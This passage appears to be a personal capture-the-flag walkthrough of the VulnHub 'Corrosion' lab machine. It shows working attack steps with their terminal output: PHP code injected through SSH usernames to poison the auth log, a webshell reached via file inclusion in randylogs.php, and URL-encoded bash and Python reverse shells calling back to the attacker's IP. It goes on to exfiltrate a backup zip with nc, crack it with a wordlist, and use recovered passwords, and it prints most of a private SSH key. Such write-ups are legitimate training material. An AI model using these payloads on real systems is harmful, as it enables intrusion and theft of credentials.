+Thursday 23 December 2021 08:55:39 PM IST 2021.12.23 20:55:39
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+ssh &#39;&lt;?php echo(&quot;hey oh!&quot;); ?&gt;&#39;@$RHOST
+The authenticity of host &#39;192.168.56.80 (192.168.56.80)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:h+1ijitcr/kVnfc33XfHyMIJifcp2Vt9He9qc+ph1Xk.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:10: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;192.168.56.80&#39; (ED25519) to the list of known hosts.
+&lt;?php echo(&quot;hey oh!&quot;); ?&gt;@192.168.56.80&#39;s password:</code></pre>
+<figure>
+<img src="18.let-there-be-logs.png" alt="" /><figcaption>18.let-there-be-logs</figcaption>
+</figure>
+<figure>
+<img src="19.yay-logs.png" alt="" /><figcaption>19.yay-logs</figcaption>
+</figure>
+<h2 id="injecting-a-webshell">injecting a webshell</h2>
+<pre class="shell"><code>ssh &#39;&lt;?php system($_GET[&quot;cmd&quot;]) ?&gt;&#39;@$RHOST
+&lt;?php system($_GET[&quot;cmd&quot;]) ?&gt;@192.168.56.80&#39;s password:</code></pre>
+<p>This didn’t work.</p>
+<figure>
+<img src="20.but-the-second-one-did.png" alt="" /><figcaption>20.but-the-second-one-did</figcaption>
+</figure>
+<div class="sourceCode" id="cb18"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a><span class="pp">encodeURI</span>(<span class="st">&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.70/443 0&gt;&amp;1&quot;&#39;</span>)</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true"></a><span class="vs">`&quot;bash%20-c%20%22bash%20-i%20%3E&amp;%20/dev/tcp/192.168.56.70/443%200%3E&amp;1%22&quot;`</span></span></code></pre></div>
+<p>Well, the process got stuck again. Logs wouldn’t log and I wouldn’t catch a reverse shell.</p>
+<p>Halt. Restore. Start.</p>
+<p>Halt. Restore. Start.</p>
+<p>(That’s not a typo.)</p>
+<pre class="shell"><code>ssh &#39;&lt;?php echo ini_get(&quot;disable_functions&quot;); ?&gt;&#39;@$RHOST
+&lt;?php echo ini_get(&quot;disable_functions&quot;); ?&gt;@192.168.56.80&#39;s password: </code></pre>
+<pre><code>Dec 23 14:11:28 corrosion sshd[1399]: Invalid user pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare, from 192.168.56.70 port 54668
+Dec 23 14:11:29 corrosion sshd[1399]: Connection closed by invalid user pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare, 192.168.56.70 port 54668 [preauth]</code></pre>
+<p>It might be that <code>system</code> function is causing issues.</p>
+<p><a href="https://stackoverflow.com/questions/7565081/alternate-to-php-exec-function">Alternatives to system</a></p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a><span class="fu">system</span><span class="ot">();</span> </span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true"></a><span class="fu">exec</span><span class="ot">();</span> </span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true"></a><span class="fu">passthru</span><span class="ot">();</span> </span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true"></a><span class="fu">shell_exec</span><span class="ot">();</span></span></code></pre></div>
+<figure>
+<img src="21.exec-and-passthru-work.png" alt="" /><figcaption>21.exec-and-passthru-work</figcaption>
+</figure>
+<p>Now if I think back, so was system working in this setting. I need to get a webshell.</p>
+<p>I think I was tired. I was adding another <code>?</code>. This is embarrassing.</p>
+<p>Also, I had a hunch that resetting the box should have corrected the error. So much noob.</p>
+<p><code>view-source:http://192.168.56.80/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;a=whoami</code></p>
+<p>Got a webshell.</p>
+<p>Cannot get a bash reverse shell. I should try a python no space one.</p>
+<p><code>view-source:http://192.168.56.80/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;a=bash%20-c%20%27which%20python%27</code> doesn’t return anything <code>view-source:http://192.168.56.80/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;a=bash%20-c%20%27which%20python3%27</code> returns /usr/bin/puthon3</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true"></a>python <span class="op">-</span>c <span class="st">&#39;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.70&quot;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span></span></code></pre></div>
+<pre><code>view-source:http://192.168.56.80/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;a=bash%20-c%20%27python3%20-c%20%27socket=__import__(%22socket%22);os=__import__(%22os%22);pty=__import__(%22pty%22);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.56.70%22,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27%27</code></pre>
+<p>Python shell, with spaces:</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true"></a>python3 <span class="op">-</span>c <span class="st">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.70&quot;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span></span></code></pre></div>
+<pre><code>view-source:http://192.168.56.80/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;a=python3%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.56.70%22,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27</code></pre>
+<p>caught a shell.</p>
+<h2 id="reverse-shell">Reverse Shell</h2>
+<figure>
+<img src="22.caught-a-reverse-shell.png" alt="" /><figcaption>22.caught-a-reverse-shell</figcaption>
+</figure>
+<figure>
+<img src="23.getting-system-info-at-first-chance.png" alt="" /><figcaption>23.getting-system-info-at-first-chance</figcaption>
+</figure>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 09:28:05 PM IST 2021.12.23 21:28:05
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+sudo nc -nlvp 443 -s $LHOST 
+Listening on 192.168.56.70 443
+Connection received on 192.168.56.80 33412
+$ whoami
+whoami
+www-data
+$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ date
+date
+Thu Dec 23 14:31:35 MST 2021
+$ hostname
+hostname
+corrosion
+$ cat /etc/hosts
+cat /etc/hosts
+127.0.0.1       localhost
+
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+$ cat /etc/*-release
+cat /etc/*-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=21.04
+DISTRIB_CODENAME=hirsute
+DISTRIB_DESCRIPTION=&quot;Ubuntu 21.04&quot;
+NAME=&quot;Ubuntu&quot;
+VERSION=&quot;21.04 (Hirsute Hippo)&quot;
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME=&quot;Ubuntu 21.04&quot;
+VERSION_ID=&quot;21.04&quot;
+HOME_URL=&quot;https://www.ubuntu.com/&quot;
+SUPPORT_URL=&quot;https://help.ubuntu.com/&quot;
+BUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;
+PRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;
+VERSION_CODENAME=hirsute
+UBUNTU_CODENAME=hirsute
+$ uname -a
+uname -a
+Linux corrosion 5.11.0-25-generic #27-Ubuntu SMP Fri Jul 9 23:06:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre>
+<h3 id="varwwwhtmlblog-postarchivesrandylogs.php">/var/www/html/blog-post/archives/randylogs.php</h3>
+<div class="sourceCode" id="cb27"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true"></a><span class="kw">&lt;?php</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true"></a>   <span class="kw">$file</span> = <span class="kw">$_GET</span><span class="ot">[</span><span class="st">&#39;file&#39;</span><span class="ot">];</span></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true"></a>   <span class="kw">if</span><span class="ot">(</span><span class="kw">isset</span><span class="ot">(</span><span class="kw">$file</span><span class="ot">))</span></span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true"></a>   {</span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true"></a>       <span class="kw">include</span><span class="ot">(</span><span class="st">&quot;</span><span class="kw">$file</span><span class="st">&quot;</span><span class="ot">);</span></span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true"></a>   }</span>
+<span id="cb27-7"><a href="#cb27-7" aria-hidden="true"></a>   <span class="kw">else</span></span>
+<span id="cb27-8"><a href="#cb27-8" aria-hidden="true"></a>   {</span>
+<span id="cb27-9"><a href="#cb27-9" aria-hidden="true"></a>       <span class="kw">include</span><span class="ot">(</span><span class="st">&quot;index.php&quot;</span><span class="ot">);</span></span>
+<span id="cb27-10"><a href="#cb27-10" aria-hidden="true"></a>   }</span>
+<span id="cb27-11"><a href="#cb27-11" aria-hidden="true"></a>   <span class="kw">?&gt;</span></span></code></pre></div>
+<h3 id="suid-binaries">SUID binaries</h3>
+<pre class="shell"><code>www-data@corrosion:/var/www$ find / -type f -perm -4000 -exec ls -la &quot;{}&quot; \; 2&gt;/dev/null
+&lt;type f -perm -4000 -exec ls -la &quot;{}&quot; \; 2&gt;/dev/null
+-rwsr-xr-x 1 root root 111080 Jul 14 16:09 /snap/snapd/12704/usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 111048 Mar 26  2021 /snap/snapd/11588/usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2074/bin/mount
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2074/bin/ping
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/2074/bin/su
+-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/2074/bin/umount
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/2074/usr/bin/chfn
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/2074/usr/bin/chsh
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/2074/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/2074/usr/bin/newgrp
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/2074/usr/bin/passwd
+-rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/2074/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/2074/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/1997/bin/mount
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1997/bin/ping
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1997/bin/su
+-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/1997/bin/umount
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1997/usr/bin/chfn
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1997/usr/bin/chsh
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1997/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1997/usr/bin/newgrp
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1997/usr/bin/passwd
+-rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/1997/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1997/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 22840 May 26  2021 /usr/libexec/polkit-agent-helper-1
+-rwsr-xr-- 1 root dip 395144 Feb 24  2021 /usr/sbin/pppd
+-rwsr-xr-x 1 root root 126024 Mar 30  2021 /usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root messagebus 51496 Feb 26  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 301512 Mar 23  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root root 14488 Apr 13  2021 /usr/lib/xorg/Xorg.wrap
+-rwsr-xr-x 1 root root 55680 Feb 26  2021 /usr/bin/mount
+-rwsr-xr-x 1 root root 72072 Feb 26  2021 /usr/bin/su
+-rwsr-xr-x 1 root root 39296 Feb 26  2021 /usr/bin/umount
+-rwsr-xr-x 1 root root 85064 Jan  6  2021 /usr/bin/chfn
+-rwsr-xr-x 1 root root 53040 Jan  6  2021 /usr/bin/chsh
+-rwsr-xr-x 1 root root 39144 Mar 23  2021 /usr/bin/fusermount
+-rwsr-xr-x 1 root root 72304 Jan  6  2021 /usr/bin/passwd
+-rwsr-xr-x 1 root root 14728 Mar  8  2021 /usr/bin/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 44784 Jan  6  2021 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 190952 Feb 17  2021 /usr/bin/sudo
+-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 88496 Jan  6  2021 /usr/bin/gpasswd
+</code></pre>
+<h3 id="backups">Backups</h3>
+<pre class="shell"><code>find / -type d -name &quot;*backup*&quot; -not -path &quot;/snap/*&quot; 2&gt;/dev/null
+find / -type f -name &quot;*backup*&quot; -not -path &quot;/snap/*&quot; 2&gt;/dev/null
+find / -type f -name &quot;*.bak&quot; -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null</code></pre>
+<pre class="shell"><code>www-data@corrosion:/var/www$ find / -type d -name &quot;*backup*&quot; -not -path &quot;/snap/*&quot; 2&gt;/dev/null
+&lt;d -name &quot;*backup*&quot; -not -path &quot;/snap/*&quot; 2&gt;/dev/null
+/var/backups
+www-data@corrosion:/var/www$ 
+
+www-data@corrosion:/var/www$ find / -type f -name &quot;*backup*&quot; -not -path &quot;/snap/*&quot; 2&gt;/dev/null
+&lt;f -name &quot;*backup*&quot; -not -path &quot;/snap/*&quot; 2&gt;/dev/null
+/var/backups/user_backup.zip
+/var/lib/app-info/icons/ubuntu-hirsute-universe/48x48/slbackup-php_web-browser.png
+/var/lib/app-info/icons/ubuntu-hirsute-universe/48x48/kup-backup_kup.png
+/var/lib/app-info/icons/ubuntu-hirsute-universe/64x64/slbackup-php_web-browser.png
+/var/lib/app-info/icons/ubuntu-hirsute-universe/64x64/kup-backup_kup.png
+/var/lib/app-info/icons/ubuntu-hirsute-universe/64x64/luckybackup_luckybackup.png
+/usr/share/tracker/tracker-backup.xml
+/usr/share/icons/Yaru/16x16@2x/apps/backups-app.png
+/usr/share/icons/Yaru/32x32@2x/apps/backups-app.png
+/usr/share/icons/Yaru/256x256/apps/backups-app.png
+/usr/share/icons/Yaru/scalable/apps/backups-app-symbolic.svg
+/usr/share/icons/Yaru/256x256@2x/apps/backups-app.png
+/usr/share/icons/Yaru/48x48/apps/backups-app.png
+/usr/share/icons/Yaru/48x48@2x/apps/backups-app.png
+/usr/share/icons/Yaru/24x24@2x/apps/backups-app.png
+/usr/share/icons/Yaru/32x32/apps/backups-app.png
+/usr/share/icons/Yaru/24x24/apps/backups-app.png
+/usr/share/icons/Yaru/16x16/apps/backups-app.png
+/usr/share/help/C/gnome-help/backup-frequency.page
+/usr/share/help/C/gnome-help/backup-how.page
+/usr/share/help/C/gnome-help/backup-restore.page
+/usr/share/help/C/gnome-help/backup-where.page
+/usr/share/help/C/gnome-help/backup-thinkabout.page
+/usr/share/help/C/gnome-help/backup-check.page
+/usr/share/help/C/gnome-help/backup-what.page
+/usr/share/help/C/gnome-help/backup-why.page
+/usr/share/help/C/seahorse/misc-key-backup.page
+/usr/share/doc/duplicity/examples/system-backup.gz
+/usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
+/usr/share/help-langpack/en_GB/evolution/backup-restore.page
+/usr/lib/modules/5.11.0-25-generic/kernel/drivers/power/supply/wm831x_backup.ko
+/usr/lib/modules/5.11.0-25-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+/usr/lib/modules/5.11.0-16-generic/kernel/drivers/power/supply/wm831x_backup.ko
+/usr/lib/modules/5.11.0-16-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+/usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+/usr/src/linux-headers-5.11.0-16-generic/include/config/net/team/mode/activebackup.h
+/usr/src/linux-headers-5.11.0-16-generic/include/config/wm831x/backup.h
+/usr/src/linux-headers-5.11.0-25/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
+/usr/src/linux-headers-5.11.0-25-generic/include/config/net/team/mode/activebackup.h
+/usr/src/linux-headers-5.11.0-25-generic/include/config/wm831x/backup.h
+/usr/src/linux-headers-5.11.0-16/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
+www-data@corrosion:/var/www$ find / -type f -name &quot;*.bak&quot; -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
+&lt;pe f -name &quot;*.bak&quot; -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
+www-data@corrosion:/var/www$ </code></pre>
+<figure>
+<img src="24.backups.png" alt="" /><figcaption>24.backups</figcaption>
+</figure>
+<pre class="shell"><code>www-data@corrosion:/var/www$ cd /tmp
+cd /tmp
+www-data@corrosion:/tmp$ cp /var/backups/user_backup.zip user_backup.zip
+cp /var/backups/user_backup.zip user_backup.zip
+www-data@corrosion:/tmp$ 
+
+www-data@corrosion:/tmp$ ls -la user_backup.zip
+ls -la user_backup.zip
+-rw-r--r-- 1 www-data www-data 3285 Dec 23 14:54 user_backup.zip
+www-data@corrosion:/tmp$ 
+
+www-data@corrosion:/tmp$ unzip user_backup.zip
+unzip user_backup.zip
+Archive:  user_backup.zip
+[user_backup.zip] id_rsa password: 
+
+   skipping: id_rsa                  incorrect password
+   skipping: id_rsa.pub              incorrect password
+   skipping: my_password.txt         incorrect password
+   skipping: easysysinfo.c           incorrect password
+www-data@corrosion:/tmp$ </code></pre>
+<h3 id="cracking-the-password">Cracking the password</h3>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 10:23:30 PM IST 2021.12.23 22:23:30
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+sudo nc -nlvp 443 -s $LHOST 
+Listening on 192.168.56.70 443
+Connection received on 192.168.56.80 33418
+$ which nc
+which nc
+/usr/bin/nc
+$ nc 192.168.56.70 6666 &lt; /tmp/user_backup.zip
+nc 192.168.56.70 6666 &lt; /tmp/user_backup.zip
+$ nc 192.168.56.70 6666 &lt; /tmp/user_backup.zip
+nc 192.168.56.70 6666 &lt; /tmp/user_backup.zip
+$ 
+</code></pre>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 10:23:05 PM IST 2021.12.23 22:23:05
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+nc -nlvp 6666 -s $LHOST &gt; user_backup.zip
+Listening on 192.168.56.70 6666
+Connection received on 192.168.56.80 37040
+^C
+                                                                                                                   
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 10:23:52 PM IST 2021.12.23 22:23:52
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+ls -la user_backup.zip
+-rw-r--r-- 1 f0c1s f0c1s 3285 Dec 23 22:23 user_backup.zip
+                                                                                                                   
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 10:24:00 PM IST 2021.12.23 22:24:00
+f0c1s@kali:~/vuln-hubs/corrosion/1 $
+fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u user_backup.zip 
+
+
+PASSWORD FOUND!!!!: pw == !randybaby</code></pre>
+<figure>
+<img src="25.cracked.png" alt="" /><figcaption>25.cracked</figcaption>
+</figure>
+<pre class="shell"><code>unzip user_backup.zip -d user_backup
+Archive:  user_backup.zip
+[user_backup.zip] id_rsa password: 
+  inflating: user_backup/id_rsa      
+  inflating: user_backup/id_rsa.pub  
+ extracting: user_backup/my_password.txt  
+  inflating: user_backup/easysysinfo.c</code></pre>
+<pre class="shell"><code>$ su randy
+su randy
+Password: randylovesgoldfish1998
+
+randy@corrosion:/tmp$ sudo -l
+sudo -l
+[sudo] password for randy: randylovesgoldfish1998
+
+Matching Defaults entries for randy on corrosion:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User randy may run the following commands on corrosion:
+    (root) PASSWD: /home/randy/tools/easysysinfo
+randy@corrosion:/tmp$ ls -la /home/randy/tools/easysysinfo
+ls -la /home/randy/tools/easysysinfo
+-rwsr-xr-x 1 root root 16192 Jul 30 00:11 /home/randy/tools/easysysinfo
+randy@corrosion:/tmp$ cd /home/randy
+cd /home/randy
+randy@corrosion:~$ ls
+ls
+Desktop    Downloads  Pictures  Templates  user.txt
+Documents  Music      Public    tools      Videos
+randy@corrosion:~$ ls -la
+ls -la
+total 88
+drwxr-x--- 17 randy randy 4096 Jul 30 16:01 .
+drwxr-xr-x  3 root  root  4096 Jul 29 17:05 ..
+-rw-rw-r--  1 randy randy   68 Jul 30 16:01 .bash_history
+-rw-r--r--  1 randy randy  220 Jul 29 17:05 .bash_logout
+-rw-r--r--  1 randy randy 3771 Jul 29 17:05 .bashrc
+drwxrwxr-x 12 randy randy 4096 Jul 30 15:19 .cache
+drwx------ 11 randy randy 4096 Jul 29 19:18 .config
+drwxr-xr-x  2 randy randy 4096 Jul 29 17:40 Desktop
+drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Documents
+drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Downloads
+drwx------  2 randy randy 4096 Jul 30 15:41 .gnupg
+drwxr-xr-x  3 randy randy 4096 Jul 29 17:11 .local
+drwx------  5 randy randy 4096 Jul 29 19:15 .mozilla
+drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Music
+drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Pictures
+-rw-r--r--  1 randy randy  807 Jul 29 17:05 .profile
+drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Public
+-rw-rw-r--  1 randy randy    0 Jul 30 14:48 .selected_editor
+drwx------  2 randy randy 4096 Jul 29 17:24 .ssh
+-rw-r--r--  1 randy randy    0 Jul 29 17:12 .sudo_as_admin_successful
+drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Templates
+drwxrwxr-x  2 randy randy 4096 Jul 30 00:11 tools
+-rw-r--r--  1 root  root    21 Jul 30 15:30 user.txt
+drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Videos
+randy@corrosion:~$ cd .ssh
+cd .ssh
+randy@corrosion:~/.ssh$ ls
+ls
+id_rsa  id_rsa.pub
+randy@corrosion:~/.ssh$ ls -la
+ls -la
+total 16
+drwx------  2 randy randy 4096 Jul 29 17:24 .
+drwxr-x--- 17 randy randy 4096 Jul 30 16:01 ..
+-rw-------  1 randy randy 2590 Jul 29 17:24 id_rsa
+-rw-r--r--  1 randy randy  563 Jul 29 17:24 id_rsa.pub
+randy@corrosion:~/.ssh$ cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
